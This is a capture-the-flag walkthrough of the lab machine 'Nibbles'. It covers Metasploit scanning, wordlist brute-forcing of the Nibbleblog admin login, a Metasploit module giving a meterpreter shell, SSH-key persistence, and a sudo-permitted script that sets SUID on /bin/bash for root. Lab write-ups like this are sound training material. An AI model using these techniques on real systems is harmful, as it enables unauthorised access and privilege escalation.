![[home.png]]

### This machine is used to test metasploit usage, thus I'll try to use metasploit as much as possible.

## I created a workspace for the target and named it 'nibbles' 

sudo service postgresql start && msfconsole
msf6 > workspace -a nibbles
[*] Added workspace: nibbles
[*] Workspace: nibbles

## SCANNING AND Enumeration
I used the msf nmap module to scan for open services, version and run default nmap scripts 
msf6 > db_nmap 10.10.10.75 --open -sVC 
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 20:52 WAT
[*] Nmap: Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
[*] Nmap: Service scan Timing: About 50.00% done; ETC: 20:52 (0:00:06 remaining)
[*] Nmap: Nmap scan report for 10.10.10.75
[*] Nmap: Host is up (0.16s latency).
[*] Nmap: Not shown: 929 closed tcp ports (conn-refused), 69 filtered tcp ports (no-response)
[*] Nmap: Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
[*] Nmap: |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
[*] Nmap: |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Site doesn't have a title (text/html).
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 29.85 seconds
msf6 > services
 services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.75  22    tcp    ssh   open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0
10.10.10.75  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)

#### Nmap results shows two open services http and ssh

Startting from the lower hanging fruit HTTP :XD
I Visited the page and, there's a welcome text on it
![[web.png]]
I then checked the source code for possible juice
![[source.png]]
and I found ther's a directory ***/nibbleblog/

I visited the page and it was a blog page, and lo and behold NIBBLEBLOG is a cms
![[nibbleblog.png]]

### GAINING ACCESS
Since it a CMS, let's check metasploit for possible expoit, 
msf6 > search nibbleblog
![[search.png]]

#### There's a metasploit module for it  
![[exp.png]]
I set the neccesary params lhost,rhost
The exploits needs a username and password module,
Usually "admin" is the username.
I bruteforced with hydra using rockyou.txt as passwordlist for 15 minutes and got nothing (It a box; the password shouldnt be that far).

I then use cewl to generate a list of passwords from the webpage
![[cewl.png]]
Seems like there's some kind of firewall, behind it which I confirmed from github, so when bruteforcing its neccessary to reduce the thread 
![[brute.png]]
I got the password to be "nibbles"
run the exploit and , i got a meterpreter session with a shell as user nibbler
![[user.png]]
### MAINTAINING ACCESS
I created an ssh id_rsa key that can be used to login to ssh remotely,
![[ssh-keygen 2.png]]
copied it to my machine, give it required permiossion and logged in
![[maintained-acces 1.png]]


### PRIVESC
I found a file personal.zip and downladed it 
I unzip it and we have a file monitor.sh, which seems the system uses to monitor the machine.

back to the machine
##### Checking for sudo privileges , user nibbler can run \
   (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
   as root
   ![[sudo-priv.png]]
   I creaed the direcories in that order and wrote a bash script to chabge the permission of ""/bin/bash" to SUID and saved as monitor.sh
   nibbler@Nibbles:~/personal/stuff$ cat monitor.sh 
#!/bin/bash
chmod +s /bin/bash
echo "Im root :XD"



I saved that, change the permission of the file to executable
then run as root and boom.....xX root..!!!
![[root.png]]
